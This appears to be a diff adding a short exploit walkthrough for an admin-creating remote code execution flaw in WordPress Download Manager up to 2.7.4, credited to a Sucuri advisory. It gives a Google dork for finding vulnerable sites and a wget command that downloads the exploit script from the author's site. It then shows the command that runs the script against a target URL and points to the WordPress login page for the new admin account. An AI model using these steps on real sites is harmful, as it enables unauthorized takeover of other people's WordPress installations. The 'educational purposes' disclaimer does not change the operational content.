@@ -1,0 +1,53 @@
+#
+# Exploit Name: Wordpress Download Manager <= 2.7.4 RCE (Add WP Administrator)              
+#
+# 
+# Vulnerability discovered by SUCURI TEAM
+#
+# http://blog.sucuri.net/2014/12/security-advisory-high-severity-wordpress-download-manager.html
+#
+#
+# Dork google wordpress:  index of "download-manager"
+#
+#
+# Tested on Wordpress Download Manager from 2.7.0 to 2.7.4 version with BackBox 3.x and python 2.6
+#
+# Exploit written by:
+#
+#                    Claudio Viviani
+#
+#                    http://www.homelab.it
+#                    info@homelab.it
+#
+#                    https://www.facebook.com/homelabit
+#                    https://twitter.com/homelabit
+#                    https://plus.google.com/+HomelabIt1/
+#                    https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
+
+
+####################################################################
+#
+# This video is intended for educational 
+# purposes only and the author can not be held liable for 
+# any kind of damages done whatsoever to your machine, 
+# or damages caused by some other,creative application of this video.
+# In any case you disagree with the above statement,stop here.
+#
+#####################################################################
+
+Wordpress: http://10.0.0.67/wordpress
+
+
+1) Download Exploit
+
+wget http://www.homelab.it/wp-content/uploads/2014/12/wp_download_manager_274_add_admin.py_.txt
+
+
+2) Run Exploit
+
+python wp_download_manager_274_add_admin.py -t http://10.0.0.67/wordpress
+
+
+3) Check Login & Password
+
+http://TARGET/wp-login.php
